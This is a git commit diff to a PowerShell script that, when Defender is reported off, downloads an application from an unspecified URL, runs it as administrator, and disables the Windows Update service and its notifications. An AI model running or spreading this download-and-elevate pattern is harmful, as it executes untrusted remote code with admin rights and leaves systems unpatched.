f77adfbad097ed785211fa2991d342c06e14a0bb
Khalil Hasanzade <112690645+hasanzadekhalil@users.noreply.github.com>
2023-06-02 11:17:53 +0400

    Update DisableScript.ps1

--- DisableScript.ps1
+++ DisableScript.ps1
@@ -12,7 +12,12 @@ if ($DefenderStatus -eq $false) {
     # Download the application
     Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath
 
-    # Run the downloaded application as administrator
+    sc.exe config wuauserv start=disabled
+    sc.exe stop wuauserv
+    $AUSettings = (New-Object -com "Microsoft.Update.AutoUpdate").Settings
+    $AUSettings.NotificationLevel = 1
+    $AUSettings.Save
+
     Start-Process -FilePath $downloadPath -Verb RunAs
     Write-Host "Windows Update is Disabling..."
     # Disable Windows Update service using Group Policy
